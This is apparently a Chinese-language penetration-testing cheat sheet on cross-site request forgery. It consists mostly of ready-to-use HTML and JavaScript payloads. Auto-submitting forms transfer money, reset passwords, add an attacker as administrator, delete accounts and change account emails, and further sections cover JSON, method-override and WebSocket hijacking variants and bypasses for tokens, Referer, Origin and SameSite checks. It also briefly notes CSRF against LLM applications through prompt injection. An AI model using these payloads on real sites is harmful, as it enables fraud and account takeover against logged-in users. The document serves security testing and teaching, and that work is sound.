# CSRF (Cross-Site Request Forgery)

## 原理

攻击者诱导已登录用户访问恶意页面，利用用户的 Cookie 自动携带特性，以用户身份执行非自愿操作（转账、改密码、删数据等）。

## 攻击链

### 1. 探测 CSRF

```http
# 检查关键操作是否有 CSRF 防护
# 1. 是否有 CSRF Token
# 2. 是否验证 Referer
# 3. 是否验证 Origin
# 4. Cookie 是否有 SameSite 属性
# 5. 是否要求 POST/PUT/DELETE
```

### 2. 基础 CSRF

```html
<!-- GET 型 CSRF -->
<img src="http://target.com/api/transfer?to=attacker&amount=1000">

<!-- POST 型 CSRF -->
<form action="http://target.com/api/transfer" method="POST">
    <input type="hidden" name="to" value="attacker">
    <input type="hidden" name="amount" value="1000">
</form>
<script>document.forms[0].submit()</script>
```

### 3. JSON CSRF

```html
<!-- 方法 1: form + text/plain -->
<form action="http://target.com/api/transfer" method="POST" enctype="text/plain">
    <input type="hidden" name='{"to":"attacker","amount":1000,"x":"' value='"}'>
</form>
<script>document.forms[0].submit()</script>

<!-- 方法 2: fetch + text/plain (CORS 限制) -->
<script>
fetch('http://target.com/api/transfer', {
    method: 'POST',
    headers: {'Content-Type': 'text/plain'},
    body: '{"to":"attacker","amount":1000}',
    credentials: 'include'
})
</script>

<!-- 方法 3: form + application/json (不工作，但可尝试) -->
```

### 4. multipart CSRF

```html
<form action="http://target.com/api/upload" method="POST" enctype="multipart/form-data">
    <input type="hidden" name="file" value="malicious">
</form>
<script>document.forms[0].submit()</script>
```

### 5. PUT/DELETE CSRF

```html
<!-- 方法 1: method override -->
<form action="http://target.com/api/user/1" method="POST">
    <input type="hidden" name="_method" value="DELETE">
</form>
<script>document.forms[0].submit()</script>

<!-- 方法 2: X-HTTP-Method-Override -->
<form action="http://target.com/api/user/1?_method=DELETE" method="POST">
</form>
```

## 绕过技巧

### 1. CSRF Token 绕过

```http
# 1. 删除 token
POST /api/transfer HTTP/1.1
# 不带 token

# 2. 空token
POST /api/transfer HTTP/1.1
csrf-token:

# 3. 任意 token
POST /api/transfer HTTP/1.1
csrf-token: a

# 4. 使用 GET 请求的 token
# 5. 使用其他用户的 token
# 6. token 不绑定 session
```

### 2. Referer 验证绕过

```http
# 1. 删除 Referer
# 通过 <meta name="referrer" content="no-referrer">
# 通过 data: URI
# 通过 javascript: URI

# 2. 子域名绕过
Referer: http://target.com.evil.com/
Referer: http://evil.target.com/

# 3. 路径绕过
Referer: http://evil.com/?target.com

# 4. 正则绕过
Referer: http://target.com.evil.com
# 如果正则是 /target\.com/
```

### 3. Origin 验证绕过

```http
# 1. 删除 Origin
# 某些浏览器不发 Origin（如 Firefox 的某些场景）

# 2. null Origin
Origin: null
# 通过 sandbox iframe
<iframe sandbox="allow-scripts" src="...">

# 3. 子域名
Origin: http://evil.target.com
```

### 4. SameSite 绕过

```http
# SameSite=Strict
# 几乎无法绕过

# SameSite=Lax
# GET 请求会发送 Cookie
# 通过 GET 型 CSRF
<img src="http://target.com/api/transfer?to=attacker&amount=1000">

# SameSite=None
# 需要 Secure 属性
# 可以正常 CSRF
```

### 5. CORS 绕过

```javascript
# 如果服务器 CORS 配置错误
# Access-Control-Allow-Origin: null
# Access-Control-Allow-Credentials: true

# 通过 sandbox iframe
<iframe sandbox="allow-scripts allow-forms" src="data:text/html,...">
```

## 利用场景

### 1. 修改密码

```html
<form action="http://target.com/api/password" method="POST">
    <input type="hidden" name="old_password" value="known">
    <input type="hidden" name="new_password" value="attacker">
</form>
<script>document.forms[0].submit()</script>
```

### 2. 添加管理员

```html
<form action="http://target.com/api/admin/add" method="POST">
    <input type="hidden" name="username" value="attacker">
    <input type="hidden" name="password" value="attacker">
    <input type="hidden" name="role" value="admin">
</form>
<script>document.forms[0].submit()</script>
```

### 3. 删除账户

```html
<form action="http://target.com/api/account/delete" method="POST">
</form>
<script>document.forms[0].submit()</script>
```

### 4. 修改邮箱

```html
<form action="http://target.com/api/email" method="POST">
    <input type="hidden" name="email" value="attacker@evil.com">
</form>
<script>document.forms[0].submit()</script>
```

### 5. 绑定第三方账号

```html
<form action="http://target.com/api/oauth/bind" method="POST">
    <input type="hidden" name="provider" value="google">
    <input type="hidden" name="account" value="attacker@gmail.com">
</form>
<script>document.forms[0].submit()</script>
```

## 2024-2026 新技术点

### 1. SameSite=Lax 绕过新方法

```http
# 2024 年发现的新绕过
# 通过 GET 请求 + 特定路径
# 通过 form 的 GET 方法
# 通过 window.open
```

### 2. Chrome Privacy Sandbox 影响

```http
# Chrome 逐步淘汰第三方 Cookie
# SameSite 默认 Lax
# CHIPS (Cookies Having Independent Partitioned State)
# 影响 CSRF 攻击
```

### 3. WebSocket CSRF (CSWSH)

```javascript
// WebSocket 不受 SameSite 限制
// 通过恶意页面建立 WebSocket 连接
var ws = new WebSocket("ws://target.com/ws")
ws.onopen = function() {
    ws.send(JSON.stringify({action: "transfer", to: "attacker", amount: 1000}))
}
```

### 4. Server-Sent Events CSRF

```javascript
// SSE CSRF
var es = new EventSource("http://target.com/api/stream")
```

### 5. WebRTC CSRF

```javascript
// WebRTC 数据通道
// 可绕过某些 CSRF 防护
```

### 6. Service Worker CSRF

```javascript
// 通过 Service Worker 持久化
// 拦截请求并修改
```

### 7. GraphQL CSRF

```http
# GraphQL 端点 CSRF
# 通过 GET 请求
GET /graphql?query=mutation{deleteUser(id:1){id}}
```

### 8. OAuth CSRF

```http
# OAuth 流程中的 CSRF
# state 参数缺失
# code 注入
```

### 9. SAML CSRF

```http
# SAML 流程中的 CSRF
# 通过 SAML Response 注入
```

### 10. AI 应用 CSRF

```http
# LLM 应用中的 CSRF
# 通过 prompt injection
# 通过工具调用
```

## 工具推荐

- **Burp Suite** — 手动测试
- **CSRF Tester** — OWASP 工具
- **CSRFire** — 自动生成 PoC
- **XSRFProbe** — CSRF 检测

## 参考链接

- [PortSwigger CSRF](https://portswigger.net/web-security/csrf)
- [OWASP CSRF Prevention](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html)
- [PayloadsAllTheThings - CSRF](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/CSRF%20Injection)
